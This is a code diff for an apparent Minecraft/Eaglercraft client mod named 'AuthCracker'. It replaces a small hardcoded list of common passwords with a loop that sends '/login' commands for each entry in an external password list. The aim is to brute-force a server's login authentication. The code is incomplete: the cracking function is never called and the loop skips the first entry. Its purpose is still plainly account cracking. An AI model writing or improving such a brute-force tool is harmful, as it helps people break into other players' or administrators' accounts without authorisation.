@@ -1,11 +1,27 @@
 ModAPI.require("player");
-//add from an js file using push
-var adminUsernames = ["owner"];
-//more passwords from passwords.js
-var commonPasswords = ["1234", "qwerty", "password", "p@ssword"];
+//also add passwords.js file
+let playerFound = false;
 
+function checkForGame() {
+    if (typeof ModAPI.player !== 'undefined') {
+        playerFound = true;
+    } else {
+        console.log('Player doesn\'t exist yet, please join a server or singleplayer world...');
+    }
+}
 
-if (ModAPI.player !== null) ModAPI.displayToChat({message: adminUsernames[0]});
+checkForGame();
 
+var passCount = passwords.length;
 
-//runUsernames();
+function runPassword() {
+        for (let i = 1; i <= passCount; i++) {
+            ModAPI.player.sendChatMessage({message: '/login ' + passwords[i]});
+        }
+}
+
+if (playerFound) {
+    ModAPI.displayToChat({msg: "Running AuthCracker!"});
+} else {
+    checkForGame();
+}
